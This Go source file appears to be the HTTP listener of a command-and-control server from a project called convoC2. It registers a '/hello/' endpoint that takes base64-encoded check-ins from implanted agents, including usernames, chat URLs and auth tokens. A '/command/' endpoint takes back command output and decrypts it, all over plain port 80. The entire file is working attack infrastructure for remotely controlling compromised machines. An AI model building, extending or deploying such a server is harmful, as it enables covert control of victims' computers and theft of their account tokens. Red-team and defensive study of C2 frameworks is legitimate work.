package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/cxnturi0n/convoC2/pkg/crypto"
)

var BindIp string

type CommandResponse struct {
	Command string `json:"command"`
	Output  string `json:"output"`
	AgentID string `json:"agentid"`
	Success bool   `json:"success"`
}

type Agent struct {
	AgentId           string
	Username          string
	ChatUrl           string
	AuthToken         string
	CommandHistory    []string
	CommandHistoryCmd []string
}

func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandResponse) {
	http.HandleFunc("/hello/", func(w http.ResponseWriter, r *http.Request) {
		base64EncodedAgent := strings.TrimPrefix(r.URL.Path, "/hello/")
		decoded, _ := base64.StdEncoding.DecodeString(base64EncodedAgent)

		var agent Agent
		_ = json.Unmarshal(decoded, &agent)
		agentChan <- agent
	})

	http.HandleFunc("/command/", func(w http.ResponseWriter, r *http.Request) {
		encodedResponse := strings.TrimPrefix(r.URL.Path, "/command/")
		decoded, _ := base64.StdEncoding.DecodeString(encodedResponse)

		var response CommandResponse
		_ = json.Unmarshal(decoded, &response)

		// Try to decrypt the output if it's encrypted
		decryptedOutput, err := crypto.Decrypt(response.Output, response.AgentID)
		if err == nil {
			// if decryption succeeds, replace with decrypted output
			response.Output = decryptedOutput
		}

		// If decryption fails, keep the original output

		commandResponsesChan <- response
	})

	err := http.ListenAndServe(BindIp+":80", nil)
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		os.Exit(1)
	}
}
